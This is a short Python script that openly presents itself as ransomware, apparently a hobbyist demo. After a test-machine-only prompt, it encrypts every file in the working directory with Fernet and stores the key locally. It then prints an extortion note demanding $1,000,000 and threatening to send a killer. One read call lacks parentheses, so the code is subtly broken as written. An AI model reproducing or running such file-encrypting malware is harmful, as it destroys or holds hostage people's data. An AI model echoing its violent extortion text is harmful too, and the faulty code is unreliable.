x = input("this ransomware is only to be executed on test machines not on your real machine. proceed?(y/n)")
if x != "y":
    quit()
else:
    print("proceeding with execution...")

#real code starts here

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "sysfile.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

#cryptography key
key = Fernet.generate_key()
with open("sysfile.key" , "wb") as encrypt:
    encrypt.write(key)

for file in files:
    with open(file , "rb") as stuff:
        contents = stuff.read
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file , "wb") as stuff:
        stuff.write(contents_encrypted)


print("All of your files have been encrypted , send me $1,000,000 in 24hrs or i will send a killer!1!")
